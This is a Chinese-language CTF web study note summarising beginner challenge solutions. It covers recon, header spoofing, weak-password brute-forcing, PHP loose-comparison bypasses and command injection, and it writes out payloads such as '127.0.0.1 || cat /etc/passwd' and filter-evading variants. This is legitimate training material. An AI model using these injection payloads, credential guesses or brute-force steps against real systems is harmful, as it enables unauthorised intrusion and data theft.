# CTF Web 学习笔记 - 2026.01.01

> 今日刷题：14 道 | 平台：BUUCTF + 攻防世界

---

## 一、信息收集

### 1.1 查看源码 (view-source)

**场景：** 右键被禁用，无法查看源码

**解决方案：**
```
方法1: F12 打开开发者工具
方法2: Ctrl+U (Windows) / Cmd+Option+U (Mac)
方法3: 地址栏输入 view-source:http://xxx.com
```

**原理：** 前端 JS 可以禁用右键菜单，但无法阻止浏览器内置功能

---

### 1.2 robots.txt (robots / Training-WWW-Robots)

**原理：**
```
robots.txt 是网站根目录下的爬虫协议文件
搜索引擎蜘蛛访问网站时首先检查此文件
用于告诉爬虫哪些目录可以抓取，哪些不可以
```

**CTF 利用：**
```
直接访问 /robots.txt
常见内容：
    User-agent: *
    Disallow: /admin/
    Disallow: /flag.php
    
→ 访问被 Disallow 的路径，往往就是 flag 所在
```

**实例：**
```
/robots.txt → 发现 /f1ag_1s_h3re.php
/robots.txt → 发现 /fl0g.php
```

---

### 1.3 备份文件泄露 (backup)

**常见备份文件后缀：**
```
.bak        index.php.bak
.swp        .index.php.swp (vim 临时文件)
.swo        .index.php.swo
~           index.php~
.old        index.php.old
.txt        index.txt
.zip        www.zip, web.zip, backup.zip
.tar.gz     www.tar.gz
.rar        www.rar
.7z         www.7z
.sql        backup.sql, dump.sql
```

**Git/SVN 泄露：**
```
/.git/config        Git 配置
/.git/HEAD          Git HEAD
/.svn/entries       SVN 目录
/.svn/wc.db         SVN 数据库
/.DS_Store          Mac 目录文件
```

**工具：**
```bash
# dirsearch 扫描
python dirsearch.py -u http://target.com -e *

# GitHack 下载 .git
python GitHack.py http://target.com/.git/
```

---

## 二、HTTP 协议

### 2.1 请求方法 (get_post)

**GET 请求：**
```
URL: http://xxx.com/?a=1&b=2
参数在 URL 中
```

**POST 请求：**
```
参数在请求体中
Content-Type: application/x-www-form-urlencoded
Body: a=1&b=2
```

**HackBar 使用：**
```
1. F12 打开 HackBar
2. 输入 URL，添加 GET 参数
3. 勾选 "Post data"，输入 POST 参数
4. Execute 发送请求
```

**curl 命令：**
```bash
# GET
curl "http://xxx.com/?a=1"

# POST
curl -X POST -d "b=2" "http://xxx.com/"
```

---

### 2.2 Cookie (cookie)

**查看方式：**
```
F12 → Application/存储 → Cookies
F12 → Network → 点击请求 → Headers → Cookie/Set-Cookie
```

**本题流程：**
```
1. 查看 Cookie，发现 look-here=cookie.php
2. 访问 /cookie.php
3. 查看响应头，发现 flag 在 Set-Cookie 或自定义头中
```

**Cookie 操作：**
```bash
# curl 带 Cookie
curl -b "session=abc123" http://xxx.com/

# curl 查看响应头
curl -I http://xxx.com/
```

---

### 2.3 HTTP 头伪造 (xff_referer / HTTP)

**常用伪造头部：**

| 头部 | 作用 | 常见值 |
|------|------|--------|
| `Referer` | 来源页面 | `https://www.google.com` |
| `User-Agent` | 浏览器标识 | `Mozilla/5.0...` 或自定义 |
| `X-Forwarded-For` | 客户端真实 IP | `127.0.0.1` |
| `X-Real-IP` | 同上 | `127.0.0.1` |
| `Client-IP` | 同上 | `127.0.0.1` |

**本题 Payload：**
```http
GET /Secret.php HTTP/1.1
Host: xxx.com
Referer: https://Sycsecret.buuoj.cn
User-Agent: Syclover
X-Forwarded-For: 127.0.0.1
```

**curl 命令：**
```bash
curl -H "Referer: https://xxx.com" \
     -H "User-Agent: Syclover" \
     -H "X-Forwarded-For: 127.0.0.1" \
     http://target.com/Secret.php
```

---

### 2.4 302 跳转 (baby_web)

**场景：** 访问 `index.php` 自动跳转到 `1.php`

**解决方案：**
```
F12 → Network → 刷新页面
观察 index.php 的响应（状态码 302）
flag 在跳转前的响应头中
```

**原理：**
```
HTTP 302 表示临时重定向
服务器返回 Location 头指向新地址
浏览器自动跳转，但原响应内容仍可捕获
```

**curl 不跟随跳转：**
```bash
curl -I http://xxx.com/index.php  # 只看响应头，不跟随跳转
```

---

## 三、前端安全

### 3.1 disabled 绕过 (disabled_button)

**场景：** 按钮被禁用，无法点击

**解决方案：**
```
方法1: F12 找到按钮元素，删除 disabled="" 属性
方法2: 直接构造 POST 请求提交表单数据
```

**示例：**
```html
<!-- 原始代码 -->
<input type="submit" disabled="" value="flag">

<!-- 修改后 -->
<input type="submit" value="flag">
```

**原理：** 前端禁用只是 UI 限制，不影响后端处理

---

## 四、弱口令与爆破

### 4.1 弱口令 (weak_auth)

**常见弱口令：**
```
admin/admin
admin/123456
admin/password
admin/admin123
root/root
test/test
```

**BurpSuite 爆破流程：**
```
1. 抓包：Proxy → Intercept → 输入账号密码 → Forward
2. 发送到 Intruder：右键 → Send to Intruder
3. 设置变量：Clear → 选中密码值 → Add
4. 设置 Payload：Payload type → Simple list → Load 字典
5. 开始攻击：Start attack
6. 分析结果：观察 Length 列，长度不同的就是正确密码
```

---

### 4.2 参数爆破 (ics-06)

**场景：** URL 中有 `?id=1`，不是 SQL 注入

**解决方案：** 爆破 id 参数
```
1. BurpSuite 抓包
2. 设置 id 为变量
3. Payload: Numbers (1-10000)
4. 观察响应长度，id=2333 时返回 flag
```

**Python 生成字典：**
```python
for i in range(1, 10001):
    print(i)
```

---

## 五、PHP 弱类型

### 5.1 弱类型比较 (simple_php)

**题目源码：**
```php
<?php
show_source(__FILE__);
include("config.php");
$a = @$_GET['a'];
$b = @$_GET['b'];

if($a == 0 and $a){      // 第一关
    echo $flag1;
}
if(is_numeric($b)){      // 第二关
    exit();
}
if($b > 1234){
    echo $flag2;
}
?>
```

**分析：**

| 条件 | 要求 | 绕过方法 |
|------|------|----------|
| `$a == 0` | 值等于 0 | 字符串 "abc" 转数字为 0 |
| `$a` 为真 | 非空非零 | "abc" 布尔值为 true |
| `!is_numeric($b)` | 不是纯数字 | "1235abc" 含字母 |
| `$b > 1234` | 数值大于 1234 | "1235abc" 转数字为 1235 |

**Payload：** `?a=abc&b=1235abc`

**PHP 弱类型规则：**
```php
// == 弱比较（会类型转换）
"abc" == 0      // true（字符串转数字为0）
"123abc" == 123 // true（截取开头数字）
"0e123" == 0    // true（科学计数法）
"0" == false    // true
"" == false     // true
[] == false     // true

// === 强比较（类型+值都相同）
"abc" === 0     // false
"123" === 123   // false
```

**is_numeric 绕过：**
```php
is_numeric("123")     // true
is_numeric("123abc")  // false
is_numeric("0x1A")    // PHP 5.x true, PHP 7+ false
is_numeric(" 123")    // true（有空格）
```

---

### 5.2 PHP 魔术常量

| 常量 | 描述 |
|------|------|
| `__FILE__` | 当前文件完整路径 |
| `__LINE__` | 当前行号 |
| `__DIR__` | 当前目录 |
| `__FUNCTION__` | 函数名 |
| `__CLASS__` | 类名 |
| `__METHOD__` | 类方法名 |

**`show_source(__FILE__)`：** 显示当前文件源码

---

## 六、命令执行

### 6.1 命令注入 (command_execution)

**场景：** 网页有 ping 功能，输入 IP 地址

**命令拼接符：**
```bash
;       # 顺序执行：cmd1; cmd2
|       # 管道：cmd1 | cmd2（cmd1 输出作为 cmd2 输入）
||      # 或：cmd1 || cmd2（cmd1 失败才执行 cmd2）
&       # 后台：cmd1 & cmd2（cmd1 后台执行）
&&      # 与：cmd1 && cmd2（cmd1 成功才执行 cmd2）
`cmd`   # 反引号：执行 cmd 并替换
$(cmd)  # 命令替换：同上
```

**Payload 示例：**
```bash
127.0.0.1; ls
127.0.0.1 | cat /flag
127.0.0.1 && whoami
127.0.0.1 || cat /etc/passwd
`whoami`
$(id)
```

**查找 flag：**
```bash
127.0.0.1; find / -name "flag*" 2>/dev/null
127.0.0.1; cat /flag
127.0.0.1; cat /flag.txt
127.0.0.1; cat /var/www/html/flag.php
```

**绕过空格过滤：**
```bash
cat${IFS}/flag
cat$IFS/flag
cat</flag
{cat,/flag}
```

---

## 七、常用工具速查

| 工具 | 用途 | 命令/操作 |
|------|------|----------|
| F12 | 查看源码/网络请求 | 开发者工具 |
| HackBar | 修改请求 | 浏览器插件 |
| BurpSuite | 抓包/改包/爆破 | 代理工具 |
| curl | 命令行 HTTP | `curl -X POST -d "a=1"` |
| dirsearch | 目录扫描 | `python dirsearch.py -u url -e *` |
| sqlmap | SQL 注入 | `sqlmap -u url --dbs` |

---

## 八、今日总结

```
✅ 信息收集：源码、robots.txt、备份文件
✅ HTTP 协议：GET/POST、Cookie、头部伪造、302 跳转
✅ 前端安全：disabled 绕过
✅ 爆破技术：弱口令、参数爆破
✅ PHP 弱类型：== 弱比较、is_numeric 绕过
✅ 命令执行：拼接符、绕过技巧
```
